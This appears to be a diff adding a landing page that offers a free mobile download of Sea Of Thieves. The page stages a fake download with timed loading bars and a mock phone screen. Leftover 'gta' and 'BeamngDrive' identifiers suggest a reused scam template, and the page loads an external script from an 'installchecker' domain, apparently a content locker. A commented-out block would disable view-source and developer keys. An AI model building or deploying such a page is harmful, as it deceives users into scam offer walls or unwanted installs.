@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Sea Of Thieves Game</title>
+
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" href="css/style.css" />
+    <link rel="stylesheet" href="css/responsev.css" />
+    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
+     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+ 
+    <script>
+           /*
+        $(document).keydown(function(event) {
+            if (event.keyCode == 123) {
+                return false;
+            } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) {
+                return false;
+            }
+        });
+
+        $(document).on("contextmenu", function(e) {
+            e.preventDefault();
+        });
+
+        document.onkeydown = function(e) {
+            if (e.ctrlKey &&
+                (e.keyCode === 67 ||
+                    e.keyCode === 86 ||
+                    e.keyCode === 85 ||
+                    e.keyCode === 117)) {
+                return false;
+            } else {
+                return true;
+            }
+        };
+        $(document).keypress("u", function(e) {
+            if (e.ctrlKey) {
+                return false;
+            } else {
+                return true;
+            }
+        });
+        */
+    </script>
+
+</head>
+
+<body>
+
+    <input type="hidden" id="gamefordown" value="">
+
+    <div class="loading hide" id="loading_page">
+        <div class="loader" id="loading_circle"></div>
+
+        <div class="gamemaker hide" id="gamemaker">
+            <div class="fakemobile">
+                <a href="" class="close_btn">X</a>
+                <div class="iphone-display">
+                    <div class="app-icon-area">
+                        <div class="app-icon-region">
+                            <img id="app_icon" alt="app icon" src="img/icone.png" class="app-modal-icon" style="width: 33px; height: 33px;">
+                        </div>
+                        <div class="fake-homescreen-app-name">
+                            <span id="app_name" class="installingAppName">Sea Of Thieves</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="gameinfo">
+                <p class="gamenameinfo" id="gamenameinfo">Game Name</p>
+                <div class="down_buttons choosed_device" id="choosed_device">
+                    <!-- android_choosed _ ios_choosed -->
+                    <span>Choosed device :</span>
+                    <button class="ios" style="margin-right: 0;"><img src="img/app-store.png" alt=""> IOS</button>
+                    <button class="android"><img src="img/android.png" alt=""> ANDROID</button>
+                </div>
+                <div class="download_button">
+                    <div data-captcha-enable="true"></div>
+
+                </div>
+                <center>
+                </center>   
+                <p class="downgame">Download your game for free</p>
+
+                <div class="block_gameinfo hide gta_down" id="block_gameinfo">
+                    <p class="downtop">Downloading...</p>
+                    <p class="downbottom">Downloading</p>
+                    <div class="loadbar">
+                        <div class="loadbarvalue"></div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+    </div>
+
+    <header>
+        <div class="logo">
+            <img src="img/logo2.png" alt="">
+        </div>
+    </header>
+
+    <div class="main">
+        <div class="container">
+
+            <!-- START APP -->
+            <div class="app_container">
+                <div class="app_image">
+                    <img src="img/icone.png" alt="">
+                    <p>Latest<b> version</b></p>
+                </div>
+                <div class="app_info">
+                    <p class="app_name">Sea Of Thieves</p>
+
+                    <div class="items">
+                        <span class="item_span user_span"><img src="img/user.png" alt=""> 640.779</span>
+                        <span class="item_span down_span"><img src="img/download.png" alt=""> Download</span>
+                    </div>
+
+                    <p class="choose_device">Choose your device</p>
+
+                    <div class="down_buttons">
+                        <button class="ios" id="gtaios"><img src="img/app-store.png" alt=""> IOS</button>
+                        <button class="android" id="gtaandroid"><img src="img/android.png" alt=""> ANDROID</button>
+                    </div>
+
+                    <div class="rating">
+                        <img src="img/star.png" alt=""><span>4.7</span>
+                    </div>
+
+                </div>
+            </div>
+            <!-- END APP -->
+
+ 
+    
+  
+
+        </div>
+    </div>
+
+
+    <script>
+        $(document).ready(function() {
+
+ 
+            $("#gtaios").click(function() {
+                $("#loading_page").removeClass("hide");
+                setTimeout(function() {
+                    $("#loading_circle").addClass("hide");
+                    $("#gamemaker").removeClass("hide");
+                    $("#choosed_device").addClass("ios_choosed");
+                    $('#gamenameinfo').text('Sea Of Thieves MOBILE');
+
+                    $('#app_name').text('Sea Of Thieves');
+                    $("#app_icon").attr("src", "img/icone.png");
+
+                    $('#gamefordown').val('BeamngDrive');
+                }, 2000);
+            });
+
+            $("#gtaandroid").click(function() {
+                $("#loading_page").removeClass("hide");
+                setTimeout(function() {
+                    $("#loading_circle").addClass("hide");
+                    $("#gamemaker").removeClass("hide");
+                    $("#choosed_device").addClass("android_choosed");
+                    $('#gamenameinfo').text('Sea Of Thieves MOBILE');
+
+                    $('#app_name').text('Sea Of Thieves');
+                    $("#app_icon").attr("src", "img/icone.png");
+
+                    $('#gamefordown').val('BeamngDrive');
+                }, 2000);
+            });
+
+    
+ 
+      $("#download_button").click(function() {
+                $("#block_gameinfo").removeClass("hide");
+                setTimeout(function() {
+                    var game = $('#gamefordown').val();
+
+                    // CHECK GAMES
+                    if (game == "BeamngDrive") {
+                        window.location = "./apps/gta/index.html";
+                    }  
+                }, 10000);
+            });
+ 
+         
+         
+            
+ 
+        });
+    </script>
+<script type="text/javascript" src="https://installchecker.com/cp/js/nnd48"></script>
+</body>
+
+</html>
